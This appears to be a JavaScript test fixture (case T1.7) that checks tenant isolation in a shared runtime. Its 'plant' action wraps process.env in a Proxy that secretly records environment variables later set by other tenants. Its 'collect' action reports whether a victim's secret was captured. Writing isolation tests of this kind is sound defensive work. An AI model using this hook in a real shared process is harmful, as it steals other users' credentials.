// T1.7: tenant A plants a hook in the shared process; tenant B's secrets then flow through it.
// action "plant": hook process.env so every later env overlay is recorded.
// action "collect": return whatever the hook captured.
export async function handler(input) {
  if (input.action === "plant") {
    globalThis.__loot = globalThis.__loot || {};
    const real = process.env;
    process.env = new Proxy(real, {
      set(target, key, value) {
        globalThis.__loot[String(key)] = String(value);
        target[key] = value;
        return true;
      },
    });
    return { planted: true };
  }
  const loot = globalThis.__loot || {};
  const stolen = Object.values(loot).some((value) => value === input.victimSecret);
  return { leaked: stolen, detail: stolen ? "captured another tenant's secret" : "nothing captured" };
}
